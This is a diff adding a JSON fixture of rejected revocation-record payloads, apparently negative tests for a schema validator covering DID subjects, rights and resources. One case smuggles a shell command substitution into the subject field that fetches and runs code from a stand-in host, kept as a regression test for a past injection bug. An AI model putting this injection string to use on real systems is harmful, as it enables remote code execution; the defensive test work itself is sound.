@@ -1,0 +1,66 @@
+[
+  {
+    "note": "All three of `subject`, `right` and `resource` identify the record.",
+    "payload": {
+      "subject": "did:webvh:QmDanScid4:dan.example",
+      "resource": "github.com/acme/gadgets"
+    }
+  },
+  {
+    "note": "A resource always names its forge.",
+    "payload": {
+      "subject": "did:webvh:QmDanScid4:dan.example",
+      "right": "git.commit.sign",
+      "resource": "acme/gadgets"
+    }
+  },
+  {
+    "note": "There is no wildcard right: revocation names the record exactly.",
+    "payload": {
+      "subject": "did:webvh:QmDanScid4:dan.example",
+      "right": "*",
+      "resource": "github.com/acme/gadgets"
+    }
+  },
+  {
+    "note": "Unknown members are refused (additionalProperties: false).",
+    "payload": {
+      "subject": "did:webvh:QmDanScid4:dan.example",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/gadgets",
+      "cascade": true
+    }
+  },
+  {
+    "note": "`subject` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
+    "payload": {
+      "subject": "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/gadgets"
+    }
+  },
+  {
+    "note": "`subject` is a DID, and a DID has no whitespace in it.",
+    "payload": {
+      "subject": "did:web:acme-vtc.example:bob evil",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/gadgets"
+    }
+  },
+  {
+    "note": "`subject` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
+    "payload": {
+      "subject": "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/gadgets"
+    }
+  },
+  {
+    "note": "`subject` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
+    "payload": {
+      "subject": "did:WebVH:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/gadgets"
+    }
+  }
+]
